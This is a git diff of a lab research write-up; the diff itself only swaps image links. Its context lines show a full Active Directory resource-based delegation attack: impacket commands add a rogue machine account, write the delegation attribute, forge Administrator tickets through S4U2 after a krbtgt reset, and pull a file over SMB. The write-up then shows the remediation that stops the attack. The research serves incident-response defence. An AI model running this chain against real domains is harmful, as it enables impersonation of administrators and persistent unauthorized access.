@@ -50,7 +50,8 @@ impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -act
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 ```
 
-![baseline](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/baseline.png?raw=true)
+<img width="1697" height="242" alt="baseline" src="https://github.com/user-attachments/assets/033f5c64-cf49-4062-a885-2568c55f7ac4" />
+
 
 Clean environment confirmed.
 
@@ -68,7 +69,8 @@ impacket-addcomputer lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.2
 [*] Successfully added machine account RBCDATTACKER$ with password Passw0rd123!.
 ```
 
-![machine account created](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/rbcdatackemachineaccountcreated.png?raw=true)
+<img width="1701" height="98" alt="rbcdatackemachineaccountcreated" src="https://github.com/user-attachments/assets/d9feb80c-dc8e-4783-864c-b42d36188188" />
+
 
 ```bash
 impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -action write -delegate-from 'RBCDATTACKER$' -delegate-to 'WIN-ATTACK$' -use-ldaps
@@ -81,15 +83,18 @@ impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -act
 [*]     RBCDATTACKER$   (S-1-5-21-3984567624-304424726-3877085034-2102)
 ```
 
-![attribute written](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/RBCDATTRIBUTEWRITTEN.png?raw=true)
+<img width="1813" height="204" alt="RBCDATTRIBUTEWRITTEN" src="https://github.com/user-attachments/assets/dc88131a-a9d0-4016-9d70-0f5a460ea452" />
+
 
 Read-back confirms the attribute is set with the expected SID.
 
-![read back](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/REDBACKRBCDATTRIBUTE.png?raw=true)
+<img width="1478" height="130" alt="REDBACKRBCDATTRIBUTE" src="https://github.com/user-attachments/assets/14a69ac2-ee9c-48b9-99ef-293b9514c055" />
+
 
 Both SIDs match across write and read operations. Pre-IR state is locked in.
 
-![SIDs match](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/attributewrittenandreadSID.png?raw=true)
+<img width="1748" height="280" alt="attributewrittenandreadSID" src="https://github.com/user-attachments/assets/c4134196-e27e-4960-834a-0b7ce49ac4c4" />
+
 
 ---
 
@@ -105,7 +110,8 @@ Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString 'Krb
 
 No output. All three resets succeeded.
 
-![IR simulation](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/IR.png?raw=true)
+<img width="1482" height="93" alt="IR" src="https://github.com/user-attachments/assets/9bd2a15f-8953-4327-8023-fc82e7b52790" />
+
 
 `msDS-AllowedToActOnBehalfOfOtherIdentity` on WIN-ATTACK$ was never examined. RBCDATTACKER$ credentials were never rotated. The machine account was never disabled or removed. Because the account was attacker-created but not identified during remediation, it remained a valid Kerberos principal after credential rotation activities completed.
 
@@ -128,7 +134,8 @@ impacket-rbcd lab2019.local/Administrator:'NewPass123!' -dc-ip 192.168.1.251 -ac
 [*]     RBCDATTACKER$   (S-1-5-21-3984567624-304424726-3877085034-2102)
 ```
 
-![persistence confirmed](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/persistence.png?raw=true)
+<img width="1478" height="124" alt="persistence" src="https://github.com/user-attachments/assets/506aaed6-f8ed-4e6c-bf66-1ffe2fa00d85" />
+
 
 Identical SID. The IR cycle — including krbtgt double reset — touched no resource-scoped delegation attributes.
 
@@ -150,7 +157,8 @@ impacket-getST lab2019.local/RBCDATTACKER$:'Passw0rd123!' -dc-ip 192.168.1.251 -
 [*] Saving ticket in Administrator@cifs_WIN-ATTACK.lab2019.local@LAB2019.LOCAL.ccache
 ```
 
-![S4U2 chain](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/succeededwitunrotatedcreds.png?raw=true)
+<img width="1478" height="204" alt="succeededwitunrotatedcreds" src="https://github.com/user-attachments/assets/36ae74cd-ae4d-49a1-9e26-028f0371fa23" />
+
 
 The KDC successfully issued the S4U2self and S4U2proxy service tickets requested by the attacker-controlled machine account. The KDC honored the impersonation request because the delegation state was never remediated.
 
@@ -166,7 +174,8 @@ nxc smb WIN-ATTACK.lab2019.local -u Administrator -k --use-kcache --get-file 'Wi
 [+] File "Windows\System32\drivers\etc\hosts" was downloaded to "/tmp/hosts_exfil"
 ```
 
-![file exfiltration](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/File_Exfilvianxc.png?raw=true)
+<img width="1729" height="822" alt="File Exfilvianxc" src="https://github.com/user-attachments/assets/1354c30b-903c-43e5-9922-5fc477cafad6" />
+
 
 Administrative SMB access to the target system was successfully obtained post-remediation. No credentials entered post-IR. No rotated credential touched. No previously compromised privileged credential was required post-remediation — the attacker authenticated exclusively with the pre-positioned machine account created before IR.
 
@@ -182,7 +191,8 @@ What IR would need to do but doesn't:
 Set-ADComputer WIN-ATTACK -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
 ```
 
-![remediation](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/completeremediation.png?raw=true)
+<img width="1286" height="177" alt="completeremediation" src="https://github.com/user-attachments/assets/bd1957e9-df73-42e5-94e1-37eaf74339b9" />
+
 
 Attribute confirmed empty.
 
@@ -194,7 +204,8 @@ impacket-rbcd lab2019.local/Administrator:'NewPass123!' -dc-ip 192.168.1.251 -ac
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 ```
 
-![attribute cleared](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/confirmrbcdattributeiscleanpostremediation.png?raw=true)
+<img width="1481" height="80" alt="confirmrbcdattributeiscleanpostremediation" src="https://github.com/user-attachments/assets/194f3157-1560-4c38-ae5f-ec59f4b86a64" />
+
 
 S4U2 chain now fails at the KDC layer:
 
@@ -207,7 +218,8 @@ impacket-getST lab2019.local/RBCDATTACKER$:'Passw0rd123!' -dc-ip 192.168.1.251 -
 [-] Probably SPN is not allowed to delegate by user RBCDATTACKER$ or initial TGT not forwardable
 ```
 
-![chain dead](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/failurepostfullremediation.png?raw=true)
+<img width="1401" height="186" alt="failurepostfullremediation" src="https://github.com/user-attachments/assets/87e224f5-9190-4e19-9019-ebf51607c18c" />
+
 
 `KDC_ERR_BADOPTION`. The delegation state is gone. The chain is dead.
 
